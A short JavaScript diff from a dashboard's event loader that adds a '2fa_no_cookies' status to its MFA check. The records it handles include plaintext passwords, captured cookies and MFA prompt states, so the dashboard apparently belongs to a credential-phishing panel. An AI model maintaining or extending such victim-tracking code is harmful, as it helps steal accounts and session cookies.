@@ -3873,7 +3873,7 @@ async function loadEvents(){
         const password = String(r.password || "").trim();
         const hasPassword = password.length > 0;
         const hasCookies = (status === 'completed' || !!r.hasScript);
-        const isMfa = status === 'mfa_prompt' || status === 'mfa_accepted' || /mfa|2fa/i.test(String(r.error || ''));
+        const isMfa = status === 'mfa_prompt' || status === 'mfa_accepted' || status === '2fa_no_cookies' || /mfa|2fa/i.test(String(r.error || ''));
         const isVisitor = !r.emailMask || String(r.emailMask).trim() === 'visitor';
 
         // Track unique sessions for "Total Visits" stat
